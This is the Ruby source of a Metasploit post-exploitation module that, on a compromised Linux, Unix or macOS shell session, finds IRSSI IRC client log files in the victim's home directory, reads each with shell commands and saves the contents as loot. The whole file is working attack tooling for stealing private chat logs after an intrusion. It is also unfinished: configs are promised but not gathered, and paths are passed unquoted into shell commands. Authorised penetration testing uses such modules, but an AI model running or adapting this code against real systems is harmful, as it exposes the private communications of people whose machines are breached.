##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File

	def initialize(info={})
		super(update_info(info,
			'Name'          => 'IRSSI Log & Config Gather',
			'Description'   => %q{
					This module works on multiple platforms and gathers config and log files for IRSSI IRC client.
			},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'HenryHoggard'],
			'Platform'      => [ 'linux', 'osx', 'unix'],
			'SessionTypes'  => [ "shell" ],
			
		))

	end

  def run
      print_status "Attempting to enumrate logs..."
      @peer = "#{session.session_host}:#{session.session_port}"
      user = session.shell_command("whoami").chomp
      
      case session.platform
      
      when /unix|linux|bsd/
        path = "/home/#{user}/irclogs/"
      when /osx/
        path = "/Users/#{user}/irclogs/"
      else
        print_error "Unsupported platform #{session.platform}"
        return
      end
      
      irclogs = get_logs(path)
      
        
      
      
  end
  

  
  def get_logs(path)
    logs = cmd_exec("find #{path} -name '*.log'")
    irc_logs = []
    logs.split("\n").each do |l|
      print_status("#{@peer} - Downloading #{l}")
      content = cmd_exec("cat #{l}")
      name = ::File.basename(l)
      irc_logs << {:log_name => name, :content => content}
      
      loot = store_loot('IRSSI_LOOT', 'text/plain', session, content, "#{@peer}_#{l}", "Logs or Configs gathered from IRSSI")
      print_good("#{@peer} - #{name} saved as #{loot}")
			
    end
    return irc_logs
  end
    

	

end
    
    